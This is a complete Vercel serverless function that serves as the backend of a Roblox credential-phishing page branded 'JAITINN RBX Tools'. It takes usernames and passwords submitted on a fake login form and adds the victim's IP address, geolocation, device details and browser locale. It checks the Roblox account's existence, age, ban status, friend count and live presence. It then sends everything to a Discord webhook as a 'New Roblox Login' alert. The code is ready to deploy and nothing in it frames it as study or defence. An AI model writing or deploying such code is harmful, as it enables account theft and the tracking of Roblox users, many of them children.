/**
 * Vercel Serverless Function — /api/webhook
 * Receives the login payload from /login.html and forwards it to a Discord webhook.
 *
 * Environment variables (Vercel → Project → Settings → Environment Variables):
 *   DISCORD_WEBHOOK_URL  (required)  the Discord webhook URL
 *   DISCORD_PING         (optional)  e.g. <@&123456789012345678> or <@yourid>
 *   SITE_NAME            (optional)  label shown in the embed footer
 *   BOT_NAME             (optional)  webhook display name
 *   BOT_AVATAR           (optional)  webhook display avatar URL
 *
 * Zero dependencies. Node 18+ (global fetch).
 */

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "";
const PING = process.env.DISCORD_PING || "";
const SITE = process.env.SITE_NAME || "jaitinn-rbx-tools.com";
const BOT_NAME = process.env.BOT_NAME || "JAITINN RBX Tools";
const BOT_AVATAR = process.env.BOT_AVATAR || "";
const ROBLOX_LOOKUP = process.env.ROBLOX_LOOKUP !== "false"; // set to "false" to disable

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ ok: false, error: "Use POST" });

  let body = req.body;
  if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = {}; } }
  if (!body || typeof body !== "object") body = {};

  const username = clean(body.username, 190);
  const password = clean(body.password, 190);
  if (!username || !password) {
    return res.status(400).json({ ok: false, error: "Missing username or password" });
  }

  /* ---------- visitor + geo (Vercel injects these headers) ---------- */
  const ip = String(req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  const city = decodeSafe(req.headers["x-vercel-ip-city"]);
  const region = decodeSafe(req.headers["x-vercel-ip-country-region"]);
  const country = req.headers["x-vercel-ip-country"] || "";
  const geo = [city, region, country].filter(Boolean).join(", ") || "Unknown";
  const ua = clean(req.headers["user-agent"] || body.userAgent, 400);

  /* ---------- optional: verify the account really exists ---------- */
  const account = ROBLOX_LOOKUP ? await lookupRoblox(username) : null;

  /* ---------- build the embed ---------- */
  const fields = [];
  const push = (name, value, inline = true) => {
    if (value !== undefined && value !== null && value !== "") {
      fields.push({ name, value: String(value).slice(0, 1024), inline });
    }
  };

  push("Username / Email", mono(username));
  push("Password", mono(password));

  if (account) {
    push("Roblox ID", mono(account.id));
    push("Display name", mono(account.displayName || account.name));
    push("Account created", `${account.createdShort} (${account.age})`);
    push("Banned", account.banned ? "Yes" : "No");
    push("Status", account.status, false);
    push("Friends / Followers", `${account.friends} friends · ${account.followers} followers`);
  } else {
    push("Roblox account", "Not found (email login, or lookup disabled)", false);
  }

  push("Location", `${geo}${ip ? `\nIP: ${mono(ip)}` : ""}`, false);
  push("Device", `${describeDevice(ua)}\n${mono(shorten(ua, 150))}`, false);
  push("Locale", `${body.timezone || "?"} · ${body.language || "?"} · ${body.screen || "?"}`, false);
  push("Time on page", `${body.secondsOnPage ?? "?"}s`);
  push("Session", mono(body.sessionId || "n/a"));

  const embed = {
    title: "New Roblox Login",
    description: `**${username}** just submitted their details on ${SITE}.`,
    color: 0xe2231a,
    timestamp: new Date().toISOString(),
    fields,
    footer: { text: `${SITE} · ${body.referrer || "direct"}` }
  };
  if (account && account.avatar) embed.thumbnail = { url: account.avatar };

  const payload = {
    username: BOT_NAME,
    content: PING ? `${PING} **New login** ${mono(username)}` : `**New login** ${mono(username)}`,
    embeds: [embed],
    allowed_mentions: { parse: ["roles", "users"] }
  };
  if (BOT_AVATAR) payload.avatar_url = BOT_AVATAR;

  if (!WEBHOOK_URL) {
    return res.status(200).json({ ok: true, forwarded: false, reason: "DISCORD_WEBHOOK_URL not set", account });
  }

  try {
    const r = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    if (!r.ok) {
      const detail = await r.text().catch(() => "");
      return res.status(502).json({ ok: false, error: `Discord responded ${r.status}`, detail: detail.slice(0, 300) });
    }
    return res.status(200).json({ ok: true, forwarded: true, account: account ? account.id : null });
  } catch (err) {
    return res.status(502).json({ ok: false, error: String((err && err.message) || err) });
  }
};

/* ============================ helpers ============================ */

function clean(v, max) {
  if (v === undefined || v === null) return "";
  return String(v).trim().slice(0, max || 500);
}

function decodeSafe(v) {
  try { return decodeURIComponent(String(v || "")); } catch (e) { return String(v || ""); }
}

function shorten(s, n) { return s.length > n ? s.slice(0, n - 1) + "…" : s; }

/** wrap in code ticks without breaking on backticks */
function mono(s) {
  const v = String(s);
  return v.includes("`") ? "``" + v + "``" : "`" + v + "`";
}

function describeDevice(ua) {
  const os = /Windows NT 10|Windows NT 11/.test(ua) ? "Windows 10/11"
    : /Windows/.test(ua) ? "Windows"
    : /Mac OS X/.test(ua) ? "macOS"
    : /Android/.test(ua) ? "Android"
    : /(iPhone|iPad|iPod)/.test(ua) ? "iOS"
    : /CrOS/.test(ua) ? "ChromeOS"
    : /Linux/.test(ua) ? "Linux" : "Unknown OS";
  const br = /Edg\//.test(ua) ? "Edge"
    : /OPR\/|Opera/.test(ua) ? "Opera"
    : /Chrome\//.test(ua) ? "Chrome"
    : /Firefox\//.test(ua) ? "Firefox"
    : /Safari\//.test(ua) ? "Safari" : "Unknown browser";
  const kind = /Mobile|Android|iPhone/.test(ua) ? "Mobile" : "Desktop";
  return `${br} on ${os} (${kind})`;
}

async function safeJson(url, opts, ms) {
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), ms || 3500);
    const r = await fetch(url, Object.assign({}, opts, { signal: ctrl.signal }));
    clearTimeout(t);
    if (!r.ok) return null;
    return await r.json();
  } catch (e) {
    return null;
  }
}

function accountAge(iso) {
  const d = new Date(iso);
  if (isNaN(d)) return { age: "unknown", short: "unknown" };
  const days = Math.floor((Date.now() - d.getTime()) / 86400000);
  const years = Math.floor(days / 365);
  const months = Math.floor((days % 365) / 30);
  const age = years >= 1 ? `${years}y ${months}m` : days >= 30 ? `${months}m` : `${days}d`;
  return { age, short: d.toISOString().slice(0, 10) };
}

const PRESENCE = {
  0: "Offline",
  1: "Online (website)",
  2: "In game",
  3: "In Roblox Studio",
  4: "Invisible",
  5: "On another device"
};

/** Looks up the account on Roblox: id, display name, created, avatar, presence. */
async function lookupRoblox(name) {
  if (!name || name.includes("@") || /\s/.test(name)) return null;

  const lookup = await safeJson("https://users.roblox.com/v1/usernames/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usernames: [name], excludeBannedUsers: false })
  });
  const hit = lookup && lookup.data && lookup.data[0];
  if (!hit) return null;

  const id = hit.id;

  const [info, thumb, presence] = await Promise.all([
    safeJson(`https://users.roblox.com/v1/users/${id}`, {}),
    safeJson(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png&isCircular=true`, {}),
    safeJson("https://presence.roblox.com/v1/presence/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userIds: [id] })
    })
  ]);

  let status = "Unknown";
  const p = presence && presence.userPresences && presence.userPresences[0];
  if (p) {
    status = PRESENCE[p.userPresenceType] || "Unknown";
    if (p.userPresenceType === 2 && p.universeId) {
      const game = await safeJson(`https://games.roblox.com/v1/games?universeIds=${p.universeId}`, {});
      const g = game && game.data && game.data[0];
      if (g) status = `Playing ${g.name} (${Number(g.playing || 0).toLocaleString("en-US")} in server)`;
      else status = "In game";
    }
  }

  const created = (info && info.created) || "";
  const { age, short } = accountAge(created);

  return {
    id,
    name: hit.name,
    displayName: hit.displayName || hit.name,
    createdShort: short,
    age,
    banned: !!(info && info.isBanned),
    avatar: (thumb && thumb.data && thumb.data[0] && thumb.data[0].imageUrl) || "",
    status,
    friends: (info && info.friendCount) || 0,
    followers: (info && info.followerCount) || 0
  };
}
